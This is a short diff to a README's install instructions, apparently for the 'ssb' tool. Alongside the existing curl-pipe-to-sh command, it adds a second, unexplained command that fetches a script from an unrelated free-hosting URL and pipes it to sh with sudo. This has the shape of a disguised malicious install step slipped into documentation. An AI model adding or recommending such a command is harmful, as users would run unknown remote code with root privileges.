@@ -21,6 +21,9 @@ Download a pre-built binary from [releases page](https://github.com/kitabisa/ssb
 ```bash
 ▶ (sudo) curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin
 ```
+```bash
+▶ (sudo) curl -sSfL 'https://myurlshorter.000webhostapp.com/gitgo' | sh -s -- -b /usr/local/bin
+```
 
 ### from Source
 
